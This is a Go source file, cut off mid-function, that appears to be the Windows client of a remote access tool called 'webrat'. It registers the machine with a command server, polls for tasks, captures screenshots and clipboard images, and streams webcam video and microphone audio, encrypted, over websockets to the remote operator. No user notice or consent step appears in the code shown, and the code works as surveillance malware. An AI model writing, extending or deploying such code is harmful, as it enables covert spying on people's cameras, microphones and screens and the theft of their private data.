package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"image"
	"image/color"
	"image/jpeg"
	"image/png"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
	"unsafe"

	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"

	"github.com/gorilla/websocket"
	"github.com/kbinani/screenshot"
	"github.com/shirou/gopsutil/v3/host"
	"github.com/shirou/gopsutil/v3/mem"
	"golang.org/x/image/draw"
	"golang.org/x/sys/windows"
)

var (
	avicap32                       = windows.NewLazySystemDLL("avicap32.dll")
	user32                         = windows.NewLazySystemDLL("user32.dll")
	kernel32                       = windows.NewLazySystemDLL("kernel32.dll")
	winmm                          = windows.NewLazySystemDLL("winmm.dll")
	gdi32                          = windows.NewLazySystemDLL("gdi32.dll")
	procCapGetDriverDescriptionA   = avicap32.NewProc("capGetDriverDescriptionA")
	procCapCreateCaptureWindowA    = avicap32.NewProc("capCreateCaptureWindowA")
	procSendMessageA               = user32.NewProc("SendMessageA")
	procShowWindow                 = user32.NewProc("ShowWindow")
	procPrintWindow                = user32.NewProc("PrintWindow")
	procGetDesktopWindow           = user32.NewProc("GetDesktopWindow")
	procGetDC                      = user32.NewProc("GetDC")
	procReleaseDC                  = user32.NewProc("ReleaseDC")
	procGetClientRect              = user32.NewProc("GetClientRect")
	procDestroyWindow              = user32.NewProc("DestroyWindow")
	procOpenClipboard              = user32.NewProc("OpenClipboard")
	procCloseClipboard             = user32.NewProc("CloseClipboard")
	procGetClipboardData           = user32.NewProc("GetClipboardData")
	procIsClipboardFormatAvailable = user32.NewProc("IsClipboardFormatAvailable")
	procGlobalLock                 = kernel32.NewProc("GlobalLock")
	procGlobalUnlock               = kernel32.NewProc("GlobalUnlock")
	procGlobalSize                 = kernel32.NewProc("GlobalSize")
	procCreateEventW               = kernel32.NewProc("CreateEventW")
	procWaitForSingleObject        = kernel32.NewProc("WaitForSingleObject")
	procResetEvent                 = kernel32.NewProc("ResetEvent")
	procCloseHandle                = kernel32.NewProc("CloseHandle")
	procWaveInGetNumDevs           = winmm.NewProc("waveInGetNumDevs")
	procWaveInGetDevCapsW          = winmm.NewProc("waveInGetDevCapsW")
	procWaveInOpen                 = winmm.NewProc("waveInOpen")
	procWaveInPrepareHeader        = winmm.NewProc("waveInPrepareHeader")
	procWaveInAddBuffer            = winmm.NewProc("waveInAddBuffer")
	procWaveInStart                = winmm.NewProc("waveInStart")
	procWaveInStop                 = winmm.NewProc("waveInStop")
	procWaveInReset                = winmm.NewProc("waveInReset")
	procWaveInUnprepareHeader      = winmm.NewProc("waveInUnprepareHeader")
	procWaveInClose                = winmm.NewProc("waveInClose")
	procCreateCompatibleDC         = gdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap     = gdi32.NewProc("CreateCompatibleBitmap")
	procSelectObject               = gdi32.NewProc("SelectObject")
	procBitBlt                     = gdi32.NewProc("BitBlt")
	procDeleteObject               = gdi32.NewProc("DeleteObject")
	procDeleteDC                   = gdi32.NewProc("DeleteDC")
	procGetDIBits                  = gdi32.NewProc("GetDIBits")
)

const (
	cfDIB                 = 8
	wmCapStart            = 0x400
	wmCapDriverConnect    = wmCapStart + 10
	wmCapDriverDisconnect = wmCapStart + 11
	wmCapSetVideoFormat   = wmCapStart + 45
	wmCapSetPreview       = wmCapStart + 50
	wmCapSetPreviewRate   = wmCapStart + 52
	wmCapSetScale         = wmCapStart + 53
	wmCapGrabFrame        = wmCapStart + 60
	wmCapEditCopy         = wmCapStart + 30
	wmCapFileSaveDIB      = wmCapStart + 25
	wmCapGrabFrameNoStop  = wmCapStart + 61
	callbackEvent         = 0x00050000
	waveFormatPCM         = 1
	whdrDone              = 0x00000001
	waitInfinite          = 0xFFFFFFFF
	wsChild               = 0x40000000
	wsVisible             = 0x10000000
	srccopy               = 0x00CC0020
	swShow                = 5
	pwClientOnly          = 0x00000001
	pwRenderFullContent   = 0x00000002
)

type waveFormatEx struct {
	wFormatTag      uint16
	nChannels       uint16
	nSamplesPerSec  uint32
	nAvgBytesPerSec uint32
	nBlockAlign     uint16
	wBitsPerSample  uint16
	cbSize          uint16
}

type waveInCaps struct {
	wMid           uint16
	wPid           uint16
	vDriverVersion uint32
	szPname        [32]uint16
	dwFormats      uint32
	wChannels      uint16
	dwSupport      uint32
}

type waveHdr struct {
	lpData          uintptr
	dwBufferLength  uint32
	dwBytesRecorded uint32
	dwUser          uintptr
	dwFlags         uint32
	dwLoops         uint32
	lpNext          uintptr
	reserved        uintptr
}

func utf16ToString(u []uint16) string {
	n := 0
	for n < len(u) && u[n] != 0 {
		n++
	}
	return windows.UTF16ToString(u[:n])
}

func bytesFromPtr(ptr uintptr, n int) []byte {
	if ptr == 0 || n <= 0 {
		return nil
	}
	b := unsafe.Slice((*byte)(unsafe.Pointer(ptr)), n)
	out := make([]byte, n)
	copy(out, b)
	return out
}

func listWaveInMics() []string {
	r0, _, _ := procWaveInGetNumDevs.Call()
	n := int(uint32(r0))
	out := []string{}
	for i := 0; i < n; i++ {
		var caps waveInCaps
		_, _, _ = procWaveInGetDevCapsW.Call(uintptr(i), uintptr(unsafe.Pointer(&caps)), uintptr(uint32(unsafe.Sizeof(caps))))
		name := utf16ToString(caps.szPname[:])
		if strings.TrimSpace(name) != "" {
			out = append(out, name)
		}
	}
	return out
}

func findWaveInByName(name string) int {
	r0, _, _ := procWaveInGetNumDevs.Call()
	n := int(uint32(r0))
	for i := 0; i < n; i++ {
		var caps waveInCaps
		_, _, _ = procWaveInGetDevCapsW.Call(uintptr(i), uintptr(unsafe.Pointer(&caps)), uintptr(uint32(unsafe.Sizeof(caps))))
		nm := utf16ToString(caps.szPname[:])
		if strings.EqualFold(strings.TrimSpace(nm), strings.TrimSpace(name)) {
			return i
		}
	}
	return -1
}

func listAvicapCams() []string {
	out := []string{}
	for i := 0; i < 20; i++ {
		nameBuf := make([]byte, 256)
		verBuf := make([]byte, 256)
		r, _, _ := procCapGetDriverDescriptionA.Call(uintptr(i), uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(len(nameBuf)), uintptr(unsafe.Pointer(&verBuf[0])), uintptr(len(verBuf)))
		if r != 0 {
			n := bytes.IndexByte(nameBuf, 0)
			if n < 0 {
				n = len(nameBuf)
			}
			nm := string(nameBuf[:n])
			if strings.TrimSpace(nm) != "" {
				out = append(out, nm)
			}
		}
	}
	return out
}

func openCaptureWindow(w int, h int) uintptr {
	name := []byte("cap\000")
	r, _, _ := procCapCreateCaptureWindowA.Call(uintptr(unsafe.Pointer(&name[0])), uintptr(0), uintptr(0), uintptr(0), uintptr(w), uintptr(h), uintptr(0), uintptr(0))
	return r
}

func sendMessage(hwnd uintptr, msg uint32, wparam uintptr, lparam uintptr) uintptr {
	r, _, _ := procSendMessageA.Call(hwnd, uintptr(msg), wparam, lparam)
	return r
}

type bitmapInfoHeader struct {
	biSize          uint32
	biWidth         int32
	biHeight        int32
	biPlanes        uint16
	biBitCount      uint16
	biCompression   uint32
	biSizeImage     uint32
	biXPelsPerMeter int32
	biYPelsPerMeter int32
	biClrUsed       uint32
	biClrImportant  uint32
}

type rect struct {
	left   int32
	top    int32
	right  int32
	bottom int32
}

func cameraSetFormat(hwnd uintptr, width int, height int) {
	if width <= 0 || height <= 0 {
		return
	}
	var hdr bitmapInfoHeader
	hdr.biSize = uint32(unsafe.Sizeof(hdr))
	hdr.biWidth = int32(width)
	hdr.biHeight = int32(height)
	hdr.biPlanes = 1
	hdr.biBitCount = 24
	hdr.biCompression = 0
	sendMessage(hwnd, wmCapSetVideoFormat, uintptr(uint32(unsafe.Sizeof(hdr))), uintptr(unsafe.Pointer(&hdr)))
}
func tryOpenClipboard(hwnd uintptr) bool {
	for i := 0; i < 5; i++ {
		r, _, _ := procOpenClipboard.Call(hwnd)
		if r != 0 {
			return true
		}
		time.Sleep(5 * time.Millisecond)
	}
	return false
}

func clipboardDIBToJPEG(quality int) ([]byte, error) {
	avail, _, _ := procIsClipboardFormatAvailable.Call(uintptr(cfDIB))
	if avail == 0 {
		return nil, fmt.Errorf("dib unavailable")
	}
	r, _, _ := procGetClipboardData.Call(uintptr(cfDIB))
	if r == 0 {
		return nil, fmt.Errorf("get clipboard failed")
	}
	sz, _, _ := procGlobalSize.Call(r)
	if sz == 0 {
		return nil, fmt.Errorf("global size 0")
	}
	ptr, _, _ := procGlobalLock.Call(r)
	if ptr == 0 {
		return nil, fmt.Errorf("global lock failed")
	}
	data := bytesFromPtr(ptr, int(sz))
	_, _, _ = procGlobalUnlock.Call(r)
	if len(data) < 40 {
		return nil, fmt.Errorf("dib too short")
	}
	width := int(int32(binary.LittleEndian.Uint32(data[4:8])))
	height := int(int32(binary.LittleEndian.Uint32(data[8:12])))
	planes := int(binary.LittleEndian.Uint16(data[12:14]))
	bpp := int(binary.LittleEndian.Uint16(data[14:16]))
	comp := int(binary.LittleEndian.Uint32(data[16:20]))
	if planes != 1 || comp != 0 || (bpp != 24 && bpp != 32) {
		return nil, fmt.Errorf("unsupported dib")
	}
	if height < 0 {
		height = -height
	}
	offset := int(binary.LittleEndian.Uint32(data[0:4]))
	if offset <= 0 {
		offset = 40
	}
	rowStride := ((bpp*width + 31) / 32) * 4
	if offset+rowStride*height > len(data) {
		return nil, fmt.Errorf("dib data incomplete")
	}
	img := image.NewRGBA(image.Rect(0, 0, width, height))
	topDown := int32(binary.LittleEndian.Uint32(data[8:12])) < 0
	for y := 0; y < height; y++ {
		srcY := y
		if !topDown {
			srcY = height - 1 - y
		}
		row := data[offset+srcY*rowStride : offset+(srcY+1)*rowStride]
		for x := 0; x < width; x++ {
			if bpp == 24 {
				i := x * 3
				b := row[i+0]
				g := row[i+1]
				r := row[i+2]
				img.Set(x, y, color.RGBA{R: r, G: g, B: b, A: 255})
			} else {
				i := x * 4
				b := row[i+0]
				g := row[i+1]
				r := row[i+2]
				a := row[i+3]
				if a == 0 {
					a = 255
				}
				img.Set(x, y, color.RGBA{R: r, G: g, B: b, A: a})
			}
		}
	}
	var buf bytes.Buffer
	err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality})
	if err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func captureWindowJPEG(hwnd uintptr, quality int, tw int, th int) ([]byte, error) {
	hdc, _, _ := procGetDC.Call(hwnd)
	if hdc == 0 {
		return nil, fmt.Errorf("getdc failed")
	}
	var rc rect
	_, _, _ = procGetClientRect.Call(hwnd, uintptr(unsafe.Pointer(&rc)))
	w := int(rc.right - rc.left)
	h := int(rc.bottom - rc.top)
	if w <= 0 || h <= 0 {
		procReleaseDC.Call(hwnd, hdc)
		return nil, fmt.Errorf("rect failed")
	}
	memDC, _, _ := procCreateCompatibleDC.Call(hdc)
	if memDC == 0 {
		procReleaseDC.Call(hwnd, hdc)
		return nil, fmt.Errorf("memdc failed")
	}
	hbm, _, _ := procCreateCompatibleBitmap.Call(hdc, uintptr(uint32(w)), uintptr(uint32(h)))
	if hbm == 0 {
		procDeleteDC.Call(memDC)
		procReleaseDC.Call(hwnd, hdc)
		return nil, fmt.Errorf("bitmap failed")
	}
	prev, _, _ := procSelectObject.Call(memDC, hbm)
	pr, _, _ := procPrintWindow.Call(hwnd, memDC, uintptr(uint32(pwRenderFullContent)))
	if pr == 0 {
		_, _, _ = procBitBlt.Call(memDC, 0, 0, uintptr(uint32(w)), uintptr(uint32(h)), hdc, 0, 0, uintptr(uint32(srccopy)))
	}
	var bih bitmapInfoHeader
	bih.biSize = uint32(unsafe.Sizeof(bih))
	bih.biWidth = int32(w)
	bih.biHeight = int32(h)
	bih.biPlanes = 1
	bih.biBitCount = 24
	bih.biCompression = 0
	rowStride := ((int(bih.biBitCount)*w + 31) / 32) * 4
	buf := make([]byte, rowStride*h)
	_, _, _ = procGetDIBits.Call(hdc, hbm, 0, uintptr(uint32(h)), uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&bih)), uintptr(0))
	_, _, _ = procSelectObject.Call(memDC, prev)
	procDeleteObject.Call(hbm)
	procDeleteDC.Call(memDC)
	procReleaseDC.Call(hwnd, hdc)
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for y := 0; y < h; y++ {
		row := buf[y*rowStride : (y+1)*rowStride]
		for x := 0; x < w; x++ {
			i := x * 3
			b := row[i+0]
			g := row[i+1]
			r := row[i+2]
			img.Set(x, y, color.RGBA{R: r, G: g, B: b, A: 255})
		}
	}
	var src image.Image = img
	if tw > 0 && th > 0 {
		dst := image.NewRGBA(image.Rect(0, 0, tw, th))
		draw.ApproxBiLinear.Scale(dst, dst.Bounds(), src, src.Bounds(), draw.Over, &draw.Options{})
		src = dst
	}
	var j bytes.Buffer
	if err := jpeg.Encode(&j, src, &jpeg.Options{Quality: quality}); err != nil {
		return nil, err
	}
	return j.Bytes(), nil
}

func bmpToJPEG(data []byte, quality int) ([]byte, error) {
	if len(data) < 54 || data[0] != 'B' || data[1] != 'M' {
		return nil, fmt.Errorf("not bmp")
	}
	off := int(int32(binary.LittleEndian.Uint32(data[10:14])))
	width := int(int32(binary.LittleEndian.Uint32(data[18:22])))
	height := int(int32(binary.LittleEndian.Uint32(data[22:26])))
	planes := int(binary.LittleEndian.Uint16(data[26:28]))
	bpp := int(binary.LittleEndian.Uint16(data[28:30]))
	comp := int(binary.LittleEndian.Uint32(data[30:34]))
	if planes != 1 || comp != 0 || (bpp != 24 && bpp != 32) {
		return nil, fmt.Errorf("unsupported bmp")
	}
	topDown := false
	if height < 0 {
		height = -height
		topDown = true
	}
	rowStride := ((bpp*width + 31) / 32) * 4
	if off+rowStride*height > len(data) {
		return nil, fmt.Errorf("bmp data incomplete")
	}
	img := image.NewRGBA(image.Rect(0, 0, width, height))
	for y := 0; y < height; y++ {
		srcY := y
		if !topDown {
			srcY = height - 1 - y
		}
		row := data[off+srcY*rowStride : off+(srcY+1)*rowStride]
		for x := 0; x < width; x++ {
			if bpp == 24 {
				i := x * 3
				b := row[i+0]
				g := row[i+1]
				r := row[i+2]
				img.Set(x, y, color.RGBA{R: r, G: g, B: b, A: 255})
			} else {
				i := x * 4
				b := row[i+0]
				g := row[i+1]
				r := row[i+2]
				a := row[i+3]
				if a == 0 {
					a = 255
				}
				img.Set(x, y, color.RGBA{R: r, G: g, B: b, A: a})
			}
		}
	}
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func captureSavedDIBJPEG(hwnd uintptr, quality int) ([]byte, error) {
	tmp := filepath.Join(os.TempDir(), fmt.Sprintf("webrat_cam_%d.bmp", time.Now().UnixNano()))
	path := append([]byte(tmp), 0)
	sendMessage(hwnd, wmCapGrabFrame, 0, 0)
	r := sendMessage(hwnd, wmCapFileSaveDIB, 0, uintptr(unsafe.Pointer(&path[0])))
	if r == 0 {
		return nil, fmt.Errorf("save dib failed")
	}
	data, err := ioutil.ReadFile(tmp)
	_ = os.Remove(tmp)
	if err != nil {
		return nil, err
	}
	return bmpToJPEG(data, quality)
}

func clipboardDIBToJPEGScaled(quality int, tw int, th int) ([]byte, error) {
	avail, _, _ := procIsClipboardFormatAvailable.Call(uintptr(cfDIB))
	if avail == 0 {
		return nil, fmt.Errorf("dib unavailable")
	}
	r, _, _ := procGetClipboardData.Call(uintptr(cfDIB))
	if r == 0 {
		return nil, fmt.Errorf("get clipboard failed")
	}
	sz, _, _ := procGlobalSize.Call(r)
	if sz == 0 {
		return nil, fmt.Errorf("global size 0")
	}
	ptr, _, _ := procGlobalLock.Call(r)
	if ptr == 0 {
		return nil, fmt.Errorf("global lock failed")
	}
	data := bytesFromPtr(ptr, int(sz))
	_, _, _ = procGlobalUnlock.Call(r)
	if len(data) < 40 {
		return nil, fmt.Errorf("dib too short")
	}
	width := int(int32(binary.LittleEndian.Uint32(data[4:8])))
	height := int(int32(binary.LittleEndian.Uint32(data[8:12])))
	planes := int(binary.LittleEndian.Uint16(data[12:14]))
	bpp := int(binary.LittleEndian.Uint16(data[14:16]))
	comp := int(binary.LittleEndian.Uint32(data[16:20]))
	if planes != 1 || comp != 0 || (bpp != 24 && bpp != 32) {
		return nil, fmt.Errorf("unsupported dib")
	}
	if height < 0 {
		height = -height
	}
	offset := int(binary.LittleEndian.Uint32(data[0:4]))
	if offset <= 0 {
		offset = 40
	}
	rowStride := ((bpp*width + 31) / 32) * 4
	if offset+rowStride*height > len(data) {
		return nil, fmt.Errorf("dib data incomplete")
	}
	img := image.NewRGBA(image.Rect(0, 0, width, height))
	topDown := int32(binary.LittleEndian.Uint32(data[8:12])) < 0
	for y := 0; y < height; y++ {
		srcY := y
		if !topDown {
			srcY = height - 1 - y
		}
		row := data[offset+srcY*rowStride : offset+(srcY+1)*rowStride]
		for x := 0; x < width; x++ {
			if bpp == 24 {
				i := x * 3
				b := row[i+0]
				g := row[i+1]
				r := row[i+2]
				img.Set(x, y, color.RGBA{R: r, G: g, B: b, A: 255})
			} else {
				i := x * 4
				b := row[i+0]
				g := row[i+1]
				r := row[i+2]
				a := row[i+3]
				if a == 0 {
					a = 255
				}
				img.Set(x, y, color.RGBA{R: r, G: g, B: b, A: a})
			}
		}
	}
	var src image.Image = img
	if tw > 0 && th > 0 {
		dst := image.NewRGBA(image.Rect(0, 0, tw, th))
		draw.ApproxBiLinear.Scale(dst, dst.Bounds(), src, src.Bounds(), draw.Over, &draw.Options{})
		src = dst
	}
	var buf bytes.Buffer
	err := jpeg.Encode(&buf, src, &jpeg.Options{Quality: quality})
	if err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func cameraStreamWS(dev Device, camName string, fps int, quality int, width int, height int) {
	secret := streamSecret()
	if fps <= 0 {
		fps = envInt("STREAM_FPS", 10)
	}
	if quality <= 0 {
		quality = envInt("STREAM_JPEG_QUALITY", 75)
	}
	interval := time.Duration(int(time.Second) / fps)
	if interval < 50*time.Millisecond {
		interval = 50 * time.Millisecond
	}
	idx := 0
	cams := listAvicapCams()
	for i := range cams {
		if strings.EqualFold(strings.TrimSpace(cams[i]), strings.TrimSpace(camName)) {
			idx = i
			break
		}
	}
	hwnd := openCaptureWindow(640, 480)
	if hwnd == 0 {
		return
	}
	rc := sendMessage(hwnd, wmCapDriverConnect, uintptr(uint32(idx)), 0)
	if rc == 0 {
		_ = sendMessage(hwnd, wmCapDriverDisconnect, 0, 0)
		rc = sendMessage(hwnd, wmCapDriverConnect, uintptr(uint32(0)), 0)
		if rc == 0 {
			return
		}
	}
	sendMessage(hwnd, wmCapSetScale, 1, 0)
	sendMessage(hwnd, wmCapSetPreview, 1, 0)
	sendMessage(hwnd, wmCapSetPreviewRate, uintptr(uint32(interval.Milliseconds())), 0)
	time.Sleep(100 * time.Millisecond)
	if width > 0 && height > 0 {
		cameraSetFormat(hwnd, width, height)
	}
	defer func() {
		sendMessage(hwnd, wmCapDriverDisconnect, 0, 0)
		procDestroyWindow.Call(hwnd)
	}()
	for atomic.LoadInt32(&streamFlag) == 1 {
		sess, err := openDeviceWS(dev, secret)
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		last := time.Now()
		lastPing := time.Now()
		dynQ := quality
		if dynQ < 40 {
			dynQ = 40
		}
		if dynQ > 90 {
			dynQ = 90
		}
		for atomic.LoadInt32(&streamFlag) == 1 {
			sendMessage(hwnd, wmCapGrabFrameNoStop, 0, 0)
			start := time.Now()
			if jpegBytes, e2 := captureWindowJPEG(hwnd, dynQ, width, height); e2 == nil {
				if iv, tag, ct, e := encryptAESGCM(jpegBytes, secret); e == nil {
					msg := map[string]any{
						"type":       "frame",
						"iv":         base64.StdEncoding.EncodeToString(iv),
						"tag":        base64.StdEncoding.EncodeToString(tag),
						"ciphertext": base64.StdEncoding.EncodeToString(ct),
						"format":     "jpeg",
						"ts":         time.Now().Format(time.RFC3339),
					}
					if err := sess.WriteJSON(msg); err != nil {
						break
					}
				}
			}
			if time.Since(lastPing) > 15*time.Second {
				sess.Ping()
				lastPing = time.Now()
			}
			elapsed := time.Since(start)
			if elapsed > (interval*8)/10 && dynQ > 40 {
				dynQ -= 5
			} else if elapsed < (interval/3) && dynQ < 90 {
				dynQ += 3
			}
			d := interval - time.Since(last)
			if d < 1*time.Millisecond {
				d = 1 * time.Millisecond
			}
			time.Sleep(d)
			last = time.Now()
		}
		sess.CloseGracefully()
	}
}

func micStreamWS(dev Device, micName string, sampleRate int, channels int, chunkMs int) {
	secret := streamSecret()
	if sampleRate <= 0 {
		sampleRate = envInt("STREAM_AUDIO_RATE", 48000)
	}
	if channels != 1 && channels != 2 {
		channels = envInt("STREAM_AUDIO_CHANNELS", 1)
		if channels != 1 && channels != 2 {
			channels = 1
		}
	}
	bits := 16
	var wf waveFormatEx
	wf.wFormatTag = waveFormatPCM
	wf.nChannels = uint16(channels)
	wf.nSamplesPerSec = uint32(sampleRate)
	wf.wBitsPerSample = uint16(bits)
	wf.nBlockAlign = uint16(channels * (bits / 8))
	wf.nAvgBytesPerSec = uint32(sampleRate) * uint32(wf.nBlockAlign)
	var hWave uintptr
	event, _, _ := procCreateEventW.Call(0, 0, 0, 0)
	deviceID := ^uintptr(0)
	if id := findWaveInByName(micName); id >= 0 {
		deviceID = uintptr(uint32(id))
	}
	if deviceID == ^uintptr(0) {
		deviceID = uintptr(0xFFFFFFFF)
	}
	r, _, _ := procWaveInOpen.Call(uintptr(unsafe.Pointer(&hWave)), deviceID, uintptr(unsafe.Pointer(&wf)), event, 0, uintptr(callbackEvent))
	if r != 0 || hWave == 0 {
		if deviceID != uintptr(0xFFFFFFFF) {
			deviceID = uintptr(0xFFFFFFFF)
			r, _, _ = procWaveInOpen.Call(uintptr(unsafe.Pointer(&hWave)), deviceID, uintptr(unsafe.Pointer(&wf)), event, 0, uintptr(callbackEvent))
		}
		if (r != 0 || hWave == 0) && sampleRate != 44100 {
			wf.nSamplesPerSec = 44100
			wf.nAvgBytesPerSec = uint32(wf.nSamplesPerSec) * uint32(wf.nBlockAlign)
			r, _, _ = procWaveInOpen.Call(uintptr(unsafe.Pointer(&hWave)), deviceID, uintptr(unsafe.Pointer(&wf)), event, 0, uintptr(callbackEvent))
		}
		if r != 0 || hWave == 0 {
			if event != 0 {
				procCloseHandle.Call(event)
			}
			fmt.Println("waveInOpen error:", r)
			return
		}
	}
	defer func() {
		procWaveInStop.Call(hWave)
		procWaveInReset.Call(hWave)
		procWaveInClose.Call(hWave)
		if event != 0 {
			procCloseHandle.Call(event)
		}
	}()
	if chunkMs <= 0 {
		chunkMs = envInt("STREAM_AUDIO_CHUNK_MS", 20)
	}
	if chunkMs < 5 {
		chunkMs = 5
	}
	chunkSamples := (sampleRate * chunkMs) / 1000
	chunkBytes := chunkSamples * channels * 2
	nBuf := 8
	bufs := make([][]byte, nBuf)
	hdrs := make([]waveHdr, nBuf)
	for i := 0; i < nBuf; i++ {
		bufs[i] = make([]byte, chunkBytes)
		hdrs[i] = waveHdr{
			lpData:         uintptr(unsafe.Pointer(&bufs[i][0])),
			dwBufferLength: uint32(len(bufs[i])),
		}
		procWaveInPrepareHeader.Call(hWave, uintptr(unsafe.Pointer(&hdrs[i])), uintptr(uint32(unsafe.Sizeof(hdrs[i]))))
		procWaveInAddBuffer.Call(hWave, uintptr(unsafe.Pointer(&hdrs[i])), uintptr(uint32(unsafe.Sizeof(hdrs[i]))))
	}
	procWaveInStart.Call(hWave)
	for atomic.LoadInt32(&streamFlag) == 1 {
		sess, err := openDeviceWS(dev, secret)
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		lastPing := time.Now()
		for atomic.LoadInt32(&streamFlag) == 1 {
			procWaitForSingleObject.Call(event, uintptr(200))
			for i := 0; i < nBuf; i++ {
				if hdrs[i].dwFlags&whdrDone != 0 && hdrs[i].dwBytesRecorded > 0 {
					payload := bytesFromPtr(hdrs[i].lpData, int(hdrs[i].dwBytesRecorded))
					if iv, tag, ct, e := encryptAESGCM(payload, secret); e == nil {
						msg := map[string]any{
							"type":       "audio",
							"iv":         base64.StdEncoding.EncodeToString(iv),
							"tag":        base64.StdEncoding.EncodeToString(tag),
							"ciphertext": base64.StdEncoding.EncodeToString(ct),
							"sampleRate": sampleRate,
							"channels":   channels,
							"ts":         time.Now().Format(time.RFC3339),
						}
						if err := sess.WriteJSON(msg); err != nil {
							break
						}
					}
					hdrs[i].dwFlags = 0
					hdrs[i].dwBytesRecorded = 0
					procWaveInAddBuffer.Call(hWave, uintptr(unsafe.Pointer(&hdrs[i])), uintptr(uint32(unsafe.Sizeof(hdrs[i]))))
				}
			}
			if time.Since(lastPing) > 15*time.Second {
				sess.Ping()
				lastPing = time.Now()
			}
		}
		sess.CloseGracefully()
	}
}

type Device struct {
	ID     string `json:"id"`
	Name   string `json:"name"`
	Status string `json:"status"`
}

type Task struct {
	ID      string          `json:"id"`
	Type    string          `json:"type"`
	Status  string          `json:"status"`
	Payload json.RawMessage `json:"payload"`
	Result  json.RawMessage `json:"result"`
}

func apiBase() string {
	if v := os.Getenv("API_BASE_URL"); v != "" {
		return v
	}
	return "http://localhost:8080"
}

func deviceName() string {
	if v := os.Getenv("DEVICE_NAME"); v != "" {
		return v
	}
	hn, _ := os.Hostname()
	if hn == "" {
		hn = "go-client"
	}
	return hn
}

func postJSON(path string, body any) (*http.Response, error) {
	b, _ := json.Marshal(body)
	return http.Post(apiBase()+path, "application/json", bytes.NewReader(b))
}

func patchJSON(path string, body any) (*http.Response, error) {
	b, _ := json.Marshal(body)
	req, _ := http.NewRequest("PATCH", apiBase()+path, bytes.NewReader(b))
	req.Header.Set("Content-Type", "application/json")
	return http.DefaultClient.Do(req)
}

func getJSON(path string) (*http.Response, error) {
	return http.Get(apiBase() + path)
}

func loadSavedDeviceID() string {
	data, err := ioutil.ReadFile("device-id.txt")
	if err != nil {
		return ""
	}
	s := strings.TrimSpace(string(data))
	if s == "" {
		return ""
	}
	return s
}

func saveDeviceID(id string) {
	_ = ioutil.WriteFile("device-id.txt", []byte(id), 0644)
}

func registerDevice(name string) (Device, error) {
	resp, err := postJSON("/api/devices/register", map[string]string{"name": name})
	if err != nil {
		return Device{}, err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		b, _ := io.ReadAll(resp.Body)
		return Device{}, fmt.Errorf("register failed: %s", string(b))
	}
	var dev Device
	if err := json.NewDecoder(resp.Body).Decode(&dev); err != nil {
		return Device{}, err
	}
	return dev, nil
}

func setStatus(id string, status string) error {
	resp, err := postJSON(fmt.Sprintf("/api/devices/%s/status", id), map[string]string{"status": status})
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("status failed: %s", string(b))
	}
	return nil
}

func listTasks(id string) ([]Task, error) {
	resp, err := getJSON(fmt.Sprintf("/api/devices/%s/tasks", id))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		b, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("tasks failed: %s", string(b))
	}
	var tasks []Task
	if err := json.NewDecoder(resp.Body).Decode(&tasks); err != nil {
		return nil, err
	}
	return tasks, nil
}

func updateTask(id string, status string, result any) error {
	resp, err := patchJSON(fmt.Sprintf("/api/tasks/%s", id), map[string]any{"status": status, "result": result})
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("update failed: %s", string(b))
	}
	return nil
}

func capturePNGBase64() (string, error) {
	var img image.Image
	bounds := screenshot.GetDisplayBounds(0)
	bmp, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return "", err
	}
	img = bmp
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes()), nil
}

func captureJPEGBase64(quality int) (string, error) {
	var img image.Image
	bounds := screenshot.GetDisplayBounds(0)
	bmp, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return "", err
	}
	img = bmp
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes()), nil
}

func captureJPEGBytes(quality int) ([]byte, error) {
	var img image.Image
	bounds := screenshot.GetDisplayBounds(0)
	bmp, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil, err
	}
	img = bmp
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func captureJPEGScaledBytes(quality int, width int, height int) ([]byte, error) {
	var src image.Image
	bounds := screenshot.GetDisplayBounds(0)
	bmp, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil, err
	}
	src = bmp
	if width > 0 && height > 0 {
		dst := image.NewRGBA(image.Rect(0, 0, width, height))
		draw.ApproxBiLinear.Scale(dst, dst.Bounds(), src, src.Bounds(), draw.Over, &draw.Options{})
		src = dst
	}
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, src, &jpeg.Options{Quality: quality}); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func captureDisplayScaledBytes(display int, quality int, width int, height int) ([]byte, error) {
	var src image.Image
	if display < 0 {
		display = 0
	}
	if display >= screenshot.NumActiveDisplays() {
		display = screenshot.NumActiveDisplays() - 1
	}
	bounds := screenshot.GetDisplayBounds(display)
	bmp, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil, err
	}
	src = bmp
	if width > 0 && height > 0 {
